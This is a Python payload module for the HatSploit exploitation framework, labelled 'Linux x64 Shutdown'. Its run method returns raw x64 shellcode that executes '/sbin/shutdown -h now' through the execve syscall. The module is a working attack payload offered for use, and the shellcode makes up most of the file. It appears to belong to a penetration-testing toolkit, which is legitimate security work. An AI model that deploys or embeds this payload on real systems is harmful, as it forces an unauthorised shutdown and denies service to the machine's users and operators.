#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    details = {
        'Category': "stager",
        'Name': "Linux x64 Shutdown",
        'Payload': "linux/x64/shutdown",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Shutdown payload for Linux x64.",
        'Architecture': "x64",
        'Platform': "linux",
        'Rank': "low",
        'Type': "one_side"
    }

    def run(self):
        return (
            b"\x48\x31\xc0\x48\x31\xd2\x50\x6a"
            b"\x77\x66\x68\x6e\x6f\x48\x89\xe3"
            b"\x50\x66\x68\x2d\x68\x48\x89\xe1"
            b"\x50\x49\xb8\x2f\x73\x62\x69\x6e"
            b"\x2f\x2f\x2f\x49\xba\x73\x68\x75"
            b"\x74\x64\x6f\x77\x6e\x41\x52\x41"
            b"\x50\x48\x89\xe7\x52\x53\x51\x57"
            b"\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
            b"\x05"
        )
